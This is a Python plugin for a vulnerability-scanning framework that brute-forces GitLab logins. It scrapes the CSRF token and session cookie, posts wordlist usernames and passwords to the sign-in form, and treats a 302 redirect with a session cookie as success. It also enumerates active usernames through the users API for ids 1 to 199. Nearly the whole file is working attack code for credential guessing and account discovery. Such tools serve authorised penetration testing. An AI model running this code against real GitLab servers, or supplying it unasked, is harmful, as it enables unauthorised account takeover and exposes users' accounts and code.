import base64
import json
import re
import urllib.parse
from xing.core.BasePlugin import BasePlugin
from xing.core.BaseThread import BaseThread
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType, thread_map


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.BRUTE
        self.vul_name = "Gitlab 弱口令"
        self.app_name = 'Gitlab'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

        self._check_str = b'GitLab<'
        self._gitlab_session_name = '_gitlab_session'
        self.username_file = "username_gitlab.txt"
        self.password_file = "password_gitlab.txt"
        self.shuffle_auth_list = True
        self.gen_user_skip = False

    def login(self, target, user, passwd):
        """
        Gitlab 登录爆破，不过存在防爆破。
        """
        url = target + "/users/sign_in"

        if len(passwd) < 8:
            return

        data_tpl = "utf8=%E2%9C%93&user%5Bremember_me%5D=0"
        data_tpl += "&authenticity_token={token}&user%5Blogin%5D={user}&user%5Bpassword%5D={password}"
        token, cookie = self._get_token_cookie()
        if not token or not cookie:
            self.logger.info("not found gitlab token {}".format(target))
            return
        token = urllib.parse.quote(token)
        user = urllib.parse.quote(user)
        passwd = urllib.parse.quote(passwd)
        headers = {
            "Cookie": "{}={}".format(self._gitlab_session_name, cookie),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = data_tpl.format(token=token, user=user, password=passwd)
        conn = http_req(url, "post", headers=headers, data=data)
        if b'You are being' not in conn.content:
            return False

        if conn.status_code != 302:
            return False

        if conn.cookies.get(self._gitlab_session_name):
            return True

    def _get_token_cookie(self):
        token = ""
        url = self.target + "/explore/projects"
        conn = http_req(url, "get")
        pattern = r'<meta\s+name="csrf-token"\s+content="([^\"]+)+"\s+/>'
        matches = re.findall(pattern=pattern, string=conn.text)
        if matches:
            token = matches[0]

        return token, conn.cookies.get(self._gitlab_session_name)

    def _get_user(self, uid):
        if self.gen_user_skip:
            return
        try:
            url = "{}/api/v4/users/{}".format(self.target, uid)
            conn = http_req(url, "get")
            data = conn.json()
            if data.get("state") == "active":
                return data.get("username")
        except json.decoder.JSONDecodeError as e:
            self.logger.info("skip gen user {}".format(self.target))
            self.gen_user_skip = True

    def gen_users(self):
        items = list(range(1, 200))
        result_map = thread_map(fun=self._get_user, items=items)
        return list(result_map.values())

    def check_app(self, target):
        url = target + "/explore/projects"
        conn = http_req(url, "get")

        if self._check_str not in conn.content:
            return False

        if b'authenticity_token' not in conn.content:
            return False

        if not conn.cookies.get(self._gitlab_session_name):
            return False

        if conn.status_code == 200:
            return True
        else:
            return False



